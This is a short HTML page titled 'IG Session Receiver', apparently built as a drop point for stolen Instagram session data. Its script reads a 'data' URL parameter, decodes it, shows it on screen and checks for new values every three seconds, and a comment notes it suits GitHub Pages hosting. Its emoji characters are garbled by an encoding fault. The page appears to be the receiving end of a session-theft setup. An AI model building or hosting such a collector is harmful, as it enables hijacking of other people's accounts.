<!DOCTYPE html><html><head><title>IG Receiver</title></head><body style="font-family:monospace;background:#000;color:lime;padding:20px;">
<h2>üïµÔ∏è IG Session Receiver</h2>
<div id="status">Send test POST ‚Üí data appears here!</div>
<pre id="log">No data yet...</pre>

<script>
// Simple GET-based receiver (GitHub Pages friendly)
const urlParams = new URLSearchParams(window.location.search);
if(urlParams.has('data')) {
    const data = decodeURIComponent(urlParams.get('data'));
    document.getElementById('log').textContent = data;
    document.getElementById('status').innerHTML = '‚úÖ DATA RECEIVED!';
}

// Auto-check URL params every 3s (for new data)
setInterval(()=>{
    const newData = new URLSearchParams(window.location.search).get('data');
    if(newData && newData !== document.getElementById('log').textContent) {
        document.getElementById('log').textContent = decodeURIComponent(newData);
    }
}, 3000);
</script>
</body></html>
